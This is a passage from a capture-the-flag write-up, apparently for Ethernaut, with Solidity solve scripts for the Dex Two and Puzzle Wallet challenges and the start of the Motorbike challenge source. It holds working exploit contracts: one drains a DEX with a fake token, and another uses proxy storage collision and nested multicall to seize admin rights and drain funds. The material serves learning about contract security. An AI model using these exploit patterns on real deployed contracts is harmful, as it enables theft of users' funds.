</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token 2 : "</span><span>, token2);
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN1 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN2 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack();
</span><span>        
</span><span>        </span><span style=color:#969896;font-style:italic>// dex.approve(address(attack), 10);
</span><span>
</span><span>        attack.</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker balance in TOKEN1 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker balance in TOKEN2 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack)));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN1 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DEX balance in TOKEN2 "</span><span>, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Dex public dex </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Dex</span><span>(</span><span style=color:#0086b3>0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9</span><span>);
</span><span>    address token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>dex.</span><span style=color:#795da3;font-weight:700>token1</span><span>();
</span><span>    address token2 </span><span style=color:#a71d5d;font-weight:700>= </span><span>dex.</span><span style=color:#795da3;font-weight:700>token2</span><span>();
</span><span>
</span><span>    MyEvilToken myToken1;
</span><span>    MyEvilToken myToken2;
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(){
</span><span>        myToken1 </span><span style=color:#a71d5d;font-weight:700>= new </span><span>MyEvilToken();
</span><span>        myToken2 </span><span style=color:#a71d5d;font-weight:700>= new </span><span>MyEvilToken();
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// IERC20(token1).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
</span><span>        </span><span style=color:#969896;font-style:italic>// IERC20(token2).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
</span><span>        
</span><span>        myToken1.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(dex), </span><span style=color:#0086b3>100</span><span>);
</span><span>        myToken2.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(dex), </span><span style=color:#0086b3>100</span><span>);
</span><span>
</span><span>
</span><span>        myToken1.</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(dex), </span><span style=color:#795da3;font-weight:700>type</span><span>(uint64).max);
</span><span>        myToken2.</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(dex), </span><span style=color:#795da3;font-weight:700>type</span><span>(uint64).max);
</span><span>
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(myToken1), token1, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token1, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        dex.</span><span style=color:#795da3;font-weight:700>swap</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(myToken2), token2, dex.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(token2, </span><span style=color:#795da3;font-weight:700>address</span><span>(dex)));
</span><span>        
</span><span>    }
</span><span>}
</span><span>
</span><span>contract MyEvilToken is </span><span style=color:#795da3;font-weight:700>ERC20</span><span>(</span><span style=color:#183691>"MyEVILToken"</span><span>, </span><span style=color:#183691>"EVIL"</span><span>){
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(){
</span><span>        </span><span style=color:#795da3;font-weight:700>_mint</span><span>(msg.sender, </span><span style=color:#0086b3>10000</span><span>);
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/DexTwoSolve.s.sol:DexTwoSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=24-puzzle-wallet>24 Puzzle Wallet</h1><p><code>PuzzleWallet.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>pragma experimental ABIEncoderV2;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./helpers/UpgradeableProxy-08.sol"</span><span>;
</span><span>
</span><span>contract PuzzleProxy is UpgradeableProxy {
</span><span>    address public pendingAdmin;
</span><span>    address public admin;
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address _admin, address _implementation, bytes memory _initData) </span><span style=color:#795da3;font-weight:700>UpgradeableProxy</span><span>(_implementation, _initData) {
</span><span>        admin </span><span style=color:#a71d5d;font-weight:700>= </span><span>_admin;
</span><span>    }
</span><span>
</span><span>    modifier onlyAdmin {
</span><span>      </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>admin, </span><span style=color:#183691>"Caller is not the admin"</span><span>);
</span><span>      _;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>proposeNewAdmin</span><span>(address _newAdmin) </span><span style=color:#795da3;font-weight:700>external </span><span>{
</span><span>        pendingAdmin </span><span style=color:#a71d5d;font-weight:700>= </span><span>_newAdmin;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approveNewAdmin</span><span>(address _expectedAdmin) </span><span style=color:#795da3;font-weight:700>external onlyAdmin </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(pendingAdmin </span><span style=color:#a71d5d;font-weight:700>== </span><span>_expectedAdmin, </span><span style=color:#183691>"Expected new admin by the current admin is not the pending admin"</span><span>);
</span><span>        admin </span><span style=color:#a71d5d;font-weight:700>= </span><span>pendingAdmin;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>upgradeTo</span><span>(address _newImplementation) </span><span style=color:#795da3;font-weight:700>external onlyAdmin </span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>_upgradeTo</span><span>(_newImplementation);
</span><span>    }
</span><span>}
</span><span>
</span><span>contract PuzzleWallet {
</span><span>    address public owner;
</span><span>    uint256 public maxBalance;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>bool) public whitelisted;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint256) public balances;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>init</span><span>(uint256 _maxBalance) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(maxBalance </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#183691>"Already initialized"</span><span>);
</span><span>        maxBalance </span><span style=color:#a71d5d;font-weight:700>= </span><span>_maxBalance;
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>
</span><span>    modifier onlyWhitelisted {
</span><span>        </span><span style=color:#62a35c>require</span><span>(whitelisted[msg.sender], </span><span style=color:#183691>"Not whitelisted"</span><span>);
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setMaxBalance</span><span>(uint256 _maxBalance) </span><span style=color:#795da3;font-weight:700>external onlyWhitelisted </span><span>{
</span><span>      </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#183691>"Contract balance is not 0"</span><span>);
</span><span>      maxBalance </span><span style=color:#a71d5d;font-weight:700>= </span><span>_maxBalance;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addToWhitelist</span><span>(address addr) </span><span style=color:#795da3;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner, </span><span style=color:#183691>"Not the owner"</span><span>);
</span><span>        whitelisted[addr] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>deposit</span><span>() </span><span style=color:#795da3;font-weight:700>external payable onlyWhitelisted </span><span>{
</span><span>      </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance </span><span style=color:#a71d5d;font-weight:700>&lt;= </span><span>maxBalance, </span><span style=color:#183691>"Max balance reached"</span><span>);
</span><span>      balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>msg.value;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>execute</span><span>(address to, uint256 value, bytes calldata data) </span><span style=color:#795da3;font-weight:700>external payable onlyWhitelisted </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>= </span><span>value, </span><span style=color:#183691>"Insufficient balance"</span><span>);
</span><span>        balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>value;
</span><span>        (bool success, ) </span><span style=color:#a71d5d;font-weight:700>= </span><span>to.call{ value: value }(data);
</span><span>        </span><span style=color:#62a35c>require</span><span>(success, </span><span style=color:#183691>"Execution failed"</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>multicall</span><span>(bytes[] calldata data) </span><span style=color:#795da3;font-weight:700>external payable onlyWhitelisted </span><span>{
</span><span>        bool depositCalled </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>false</span><span>;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>for </span><span>(uint256 i </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>; i </span><span style=color:#a71d5d;font-weight:700>&lt; </span><span>data.length; i</span><span style=color:#a71d5d;font-weight:700>++</span><span>) {
</span><span>            bytes memory _data </span><span style=color:#a71d5d;font-weight:700>= </span><span>data[i];
</span><span>            bytes4 selector;
</span><span>            assembly {
</span><span>                selector :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>mload</span><span>(</span><span style=color:#795da3;font-weight:700>add</span><span>(_data, </span><span style=color:#0086b3>32</span><span>))
</span><span>            }
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(selector </span><span style=color:#a71d5d;font-weight:700>== </span><span>this.deposit.selector) {
</span><span>                </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>depositCalled, </span><span style=color:#183691>"Deposit can only be called once"</span><span>);
</span><span>                </span><span style=color:#969896;font-style:italic>// Protect against reusing msg.value
</span><span>                depositCalled </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>            }
</span><span>            (bool success, ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(this).</span><span style=color:#795da3;font-weight:700>delegatecall</span><span>(data[i]);
</span><span>            </span><span style=color:#62a35c>require</span><span>(success, </span><span style=color:#183691>"Error while delegating call"</span><span>);
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>You'll need to hijack this wallet to become the admin of the proxy.</ol><ul><li>Solution</ul><ol><li>PuzzleProxy is a proxy contract and PuzzleWallet is an implementation contract.<li>Calls to PuzzleProxy will be forwarded to the PuzzleWallet through delegatecall.<li>Recall that <code>delegatecall</code> updates the storage of the caller contract. So, the storage layout should not possess any collisons.<li>Here, the storage layout of the two contracts are not matched. It may lead to storage collisions.<li>Lets understand the goal of the challenge. We need to become the admin of the proxy contract.<li>We can propose a new admin which will update the <code>pendingAdmin</code> variable in PuzzleProxy as well as the <code>owner</code> inside PuzzleWallet. Because of storage collision.<li>Then call the <code>addToWhiteList()</code> with our Attacker address to be able to call other functions of PuzzleWallet.<li>To override the <code>admin</code> variable in PuzzleProxy contract we have to change the <code>maxPrice</code> variable to address of our Attacker.<li>To update <code>maxPrice</code> we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the <code>execute()</code> function.<li>If we somehow able to pass this <code>require(balances[msg.sender] >= value, "Insufficient balance");</code> check we can withdraw more ether from wallet.<li>To do so, we need to send 0.001 ether only to the wallet, but we need to update the <code>balance[msg.sender]</code> to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.<li>We can use the <code>multicall()</code> function to do this, we call the <code>multicall()</code> with 0.001 ether and pass the function signature of the <code>deposit()</code> so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.<li>We cant call <code>deposit()</code> twice in a single call by passing calldata as [signature of <code>deposit</code> + signature of <code>deposit</code>]. As there is a check to catch this case.<li>But we can send the singature of the <code>deposit()</code> and a call to <code>multicall()</code> again with the <code>deposit()</code> signature.<li>That is we are calling multicall with a <code>deposit()</code> calldata along with multicall calldata with <code>deposit()</code> signature. i.e, a nested multicall.<li>This will modify the <code>balance[msg.sender]</code> twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.<li>Now we have enough <code>balance[msg.sender]</code> to pass the check done in <code>execute()</code> function.<li>So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes zero.</ol><p><code>PuzzleWalletSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/PuzzleWallet.sol"</span><span>;
</span><span>
</span><span>contract PuzzleWalletSolve is Script{
</span><span>    PuzzleProxy public proxy </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>PuzzleProxy</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span>));
</span><span>    PuzzleWallet public wallet </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>PuzzleWallet</span><span>(</span><span style=color:#0086b3>0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Wallet Owner  :"</span><span>, wallet.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Proxy Admin :"</span><span>, proxy.</span><span style=color:#795da3;font-weight:700>admin</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Wallet Max Balance : "</span><span>, wallet.</span><span style=color:#795da3;font-weight:700>maxBalance</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Proxy Pending Admin : "</span><span>, proxy.</span><span style=color:#795da3;font-weight:700>pendingAdmin</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Wallet balance : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(wallet).balance);
</span><span>
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack();
</span><span>
</span><span>        attack.exploit{value: </span><span style=color:#0086b3>0.001 </span><span>ether}();
</span><span>
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Wallet Owner  :"</span><span>, wallet.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Proxy Admin :"</span><span>, proxy.</span><span style=color:#795da3;font-weight:700>admin</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Wallet Max Balance : "</span><span>, wallet.</span><span style=color:#795da3;font-weight:700>maxBalance</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Proxy Pending Admin : "</span><span>, proxy.</span><span style=color:#795da3;font-weight:700>pendingAdmin</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Wallet balance : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(wallet).balance);
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>
</span><span>contract Attack {
</span><span>    PuzzleProxy public proxy </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>PuzzleProxy</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span>));
</span><span>    PuzzleWallet public wallet </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>PuzzleWallet</span><span>(</span><span style=color:#0086b3>0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>payable public</span><span>{
</span><span>        proxy.</span><span style=color:#795da3;font-weight:700>proposeNewAdmin</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)); </span><span style=color:#969896;font-style:italic>// Changes pendingAdmin in Proxy and overwrites owner in Wallet
</span><span>
</span><span>        wallet.</span><span style=color:#795da3;font-weight:700>addToWhitelist</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this));
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// To set maxPrice ==> Wallet Balance should be 0, But Initiall Wallet Balance : 1000000000000000 (0.001 ETH)
</span><span>        </span><span style=color:#969896;font-style:italic>// Make Wallet Balance 0
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// use multicall to call deposit and multicall again with 0.001 eth
</span><span>
</span><span>        bytes[] memory _depositSelector </span><span style=color:#a71d5d;font-weight:700>= new </span><span>bytes[](</span><span style=color:#0086b3>1</span><span>) ;
</span><span>        _depositSelector[</span><span style=color:#0086b3>0</span><span>] </span><span style=color:#a71d5d;font-weight:700>= </span><span>abi.</span><span style=color:#795da3;font-weight:700>encodeWithSelector</span><span>(wallet.deposit.selector);
</span><span>
</span><span>        
</span><span>        bytes[] memory _nestedMulti </span><span style=color:#a71d5d;font-weight:700>= new </span><span>bytes[](</span><span style=color:#0086b3>2</span><span>);
</span><span>        _nestedMulti[</span><span style=color:#0086b3>0</span><span>] </span><span style=color:#a71d5d;font-weight:700>= </span><span>abi.</span><span style=color:#795da3;font-weight:700>encodeWithSelector</span><span>(wallet.deposit.selector);
</span><span>        _nestedMulti[</span><span style=color:#0086b3>1</span><span>] </span><span style=color:#a71d5d;font-weight:700>= </span><span>abi.</span><span style=color:#795da3;font-weight:700>encodeWithSelector</span><span>(wallet.multicall.selector, _depositSelector);  </span><span style=color:#969896;font-style:italic>// multicall calldata
</span><span>        </span><span style=color:#969896;font-style:italic>// [deposit selector, multicall selector [deposit] ]
</span><span>        wallet.multicall{value: </span><span style=color:#0086b3>0.001 </span><span>ether}(_nestedMulti);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Wallet Balance : 0.002 ETH
</span><span>        </span><span style=color:#969896;font-style:italic>// Balance[msg.sender] = Balance[Attacker] = 0.003 ETH
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Call Execute function with amount 0.002
</span><span>
</span><span>        wallet.</span><span style=color:#795da3;font-weight:700>execute</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this), </span><span style=color:#0086b3>0.002 </span><span>ether, </span><span style=color:#183691>""</span><span>);
</span><span>
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Now Wallet Balance ==> 0
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// wallet.setMaxBalance(uint256(uint160(address(this))));
</span><span>        
</span><span>        wallet.</span><span style=color:#795da3;font-weight:700>setMaxBalance</span><span>(</span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#795da3;font-weight:700>uint160</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span>)))); </span><span style=color:#969896;font-style:italic>// sets proxyAdmin
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>receive</span><span>() payable external{}
</span><span>}
</span><span style=color:#969896;font-style:italic>/*
</span><span style=color:#969896;font-style:italic>            // Proxy                            // Wallet
</span><span style=color:#969896;font-style:italic>        address public pendingAdmin;    |  address public owner;
</span><span style=color:#969896;font-style:italic>        address public admin;           |  uint256 public maxBalance;
</span><span style=color:#969896;font-style:italic>*/
</span><span>
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/PuzzleWalletSolve.s.sol:PuzzleWalletSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=25-motorbike>25 Motorbike</h1><p><code>Motorbike.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span style=color:#0086b3>0.7</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts-06/utils/Address.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts-06/proxy/Initializable.sol"</span><span>;
</span><span>
</span><span>contract Motorbike {
</span><span>    </span><span style=color:#969896;font-style:italic>// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span><span>    bytes32 internal constant _IMPLEMENTATION_SLOT </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>;
</span><span>    
</span><span>    struct AddressSlot {
</span><span>        address value;
</span><span>    }
</span><span>    
</span><span>    </span><span style=color:#969896;font-style:italic>// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address _logic) public {
</span><span>        </span><span style=color:#62a35c>require</span><span>(Address.</span><span style=color:#795da3;font-weight:700>isContract</span><span>(_logic), </span><span style=color:#183691>"ERC1967: new implementation is not a contract"</span><span>);
</span><span>        </span><span style=color:#795da3;font-weight:700>_getAddressSlot</span><span>(_IMPLEMENTATION_SLOT).value </span><span style=color:#a71d5d;font-weight:700>= </span><span>_logic;
</span><span>        (bool success,) </span><span style=color:#a71d5d;font-weight:700>= </span><span>_logic.</span><span style=color:#795da3;font-weight:700>delegatecall</span><span>(
</span><span>            abi.</span><span style=color:#795da3;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"initialize()"</span><span>)
</span><span>        );
</span><span>        </span><span style=color:#62a35c>require</span><span>(success, </span><span style=color:#183691>"Call failed"</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Delegates the current call to `implementation`.
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_delegate</span><span>(address implementation) </span><span style=color:#795da3;font-weight:700>internal virtual </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// solhint-disable-next-line no-inline-assembly
</span><span>        assembly {
</span><span>            </span><span style=color:#795da3;font-weight:700>calldatacopy</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>calldatasize</span><span>())
</span><span>            </span><span style=color:#a71d5d;font-weight:700>let </span><span>result </span><span style=color:#a71d5d;font-weight:700>:</span><span>= delegatecall(gas(), implementation, </span><span style=color:#0086b3>0</span><span>, calldatasize(), </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>)
</span><span>            </span><span style=color:#795da3;font-weight:700>returndatacopy</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>returndatasize</span><span>())
</span><span>            </span><span style=color:#a71d5d;font-weight:700>switch </span><span>result
</span><span>            </span><span style=color:#a71d5d;font-weight:700>case </span><span style=color:#0086b3>0 </span><span>{ </span><span style=color:#795da3;font-weight:700>revert</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>returndatasize</span><span>()) }
</span><span>            </span><span style=color:#a71d5d;font-weight:700>default </span><span>{ </span><span style=color:#a71d5d;font-weight:700>return</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>returndatasize</span><span>()) }
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Fallback function that delegates calls to the address returned by `_implementation()`. 
</span><span>    </span><span style=color:#969896;font-style:italic>// Will run if no other function in the contract matches the call data
</span><span>    </span><span style=color:#795da3;font-weight:700>fallback </span><span>() external payable virtual {
</span><span>        </span><span style=color:#795da3;font-weight:700>_delegate</span><span>(</span><span style=color:#795da3;font-weight:700>_getAddressSlot</span><span>(_IMPLEMENTATION_SLOT).value);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns an `AddressSlot` with member `value` located at `slot`.
